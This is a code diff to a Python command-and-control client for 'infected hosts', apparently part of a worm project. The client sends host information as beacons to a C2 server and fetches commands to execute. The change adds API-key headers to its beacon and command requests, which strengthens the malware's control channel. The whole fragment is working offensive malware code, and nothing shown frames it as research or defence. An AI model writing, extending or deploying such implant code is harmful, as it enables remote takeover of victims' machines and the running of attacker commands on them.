@@ -10,6 +10,7 @@ Handles beacon sending and command execution on infected hosts
 """
 
 
+import os
 import platform
 import socket
 import time
@@ -27,9 +28,10 @@ class C2Client:
     Sends beacons and receives commands from C2 server
     """
 
-    def __init__(self, c2_server: str, c2_port: int, beacon_interval: int = 60):
+    def __init__(self, c2_server: str, c2_port: int, api_key: str = None, beacon_interval: int = 60):
         self.c2_server = c2_server
         self.c2_port = c2_port
+        self.api_key = api_key or os.getenv("WORMY_C2_API_KEY", "")
         self.beacon_interval = beacon_interval
         self.host_id = str(uuid.uuid4())
         self.running = False
@@ -67,8 +69,9 @@ class C2Client:
         """
         try:
             url = f"http://{self.c2_server}:{self.c2_port}/api/beacon"
+            headers = {"X-API-Key": self.api_key} if self.api_key else {}
 
-            response = requests.post(url, json=self.host_info, timeout=10)
+            response = requests.post(url, json=self.host_info, headers=headers, timeout=10)
 
             if response.status_code == 200:
                 data = response.json()
@@ -91,8 +94,9 @@ class C2Client:
         """Fetch and execute pending command from C2"""
         try:
             url = f"http://{self.c2_server}:{self.c2_port}/api/command/{self.host_id}"
+            headers = {"X-API-Key": self.api_key} if self.api_key else {}
 
-            response = requests.get(url, timeout=10)
+            response = requests.get(url, headers=headers, timeout=10)
 
             if response.status_code == 200:
                 data = response.json()
